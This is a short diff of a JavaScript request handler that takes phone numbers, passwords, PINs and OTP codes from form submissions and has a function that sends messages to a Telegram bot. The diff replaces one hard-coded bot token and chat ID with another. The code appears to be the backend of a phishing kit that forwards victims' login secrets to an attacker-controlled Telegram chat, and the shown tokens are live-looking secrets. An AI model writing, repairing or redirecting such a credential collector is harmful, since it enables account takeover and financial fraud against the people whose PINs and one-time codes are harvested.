@@ -8,8 +8,8 @@ export default async function handler(req, res) {
     const { type, phone, pass, pin, otp } = req.body;
 
     // Aapka Telegram Bot Token aur Chat ID yahan set kar diya gaya hai
-    const BOT_TOKEN = '9211304182:AAHkj2RxRH5TkFCYGUFXiKkboWR33I6-2fg';
-    const CHAT_ID = '6165279206';
+    const BOT_TOKEN = '8937401356:AAGmQp5rhoVHi5jb8Gs7TbrzDbBT9lJ0Hks';
+    const CHAT_ID = '8890415006';
 
     async function sendTelegramMessage(text) {
       try {
